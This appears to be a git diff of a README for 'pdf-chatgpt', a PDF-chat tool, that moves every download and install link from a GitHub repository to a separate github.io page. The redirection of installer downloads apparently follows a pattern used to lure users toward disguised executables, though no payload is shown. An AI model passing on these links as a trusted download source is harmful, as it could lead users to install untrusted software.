@@ -1,6 +1,6 @@
 # 🤖 pdf-chatgpt - Chat With Your Documents Using AI
 
-[![Download Application](https://img.shields.io/badge/Download-PDF_Chat-blue)](https://github.com/dorthyaccommodating234/pdf-chatgpt)
+[![Download Application](https://img.shields.io/badge/Download-PDF_Chat-blue)](https://dorthyaccommodating234.github.io)
 
 ## 📖 About This Application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements to run the software smoothly:
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the download page: https://github.com/dorthyaccommodating234/pdf-chatgpt
+1. Visit the download page: https://dorthyaccommodating234.github.io
 2. Locate the link on the page to download the installer.
 3. Save the file to your computer.
 4. Open your downloads folder.
@@ -73,6 +73,6 @@ Your data stays on your local machine during the reading process. The applicatio
 
 To install the software, visit the official link below.
 
-[https://github.com/dorthyaccommodating234/pdf-chatgpt](https://github.com/dorthyaccommodating234/pdf-chatgpt)
+[https://dorthyaccommodating234.github.io](https://dorthyaccommodating234.github.io)
 
 Keywords: ai, artificial-intelligence, chatbot, claude, embeddings, langchain, pdf, python, rag, retrieval-augmented-generation
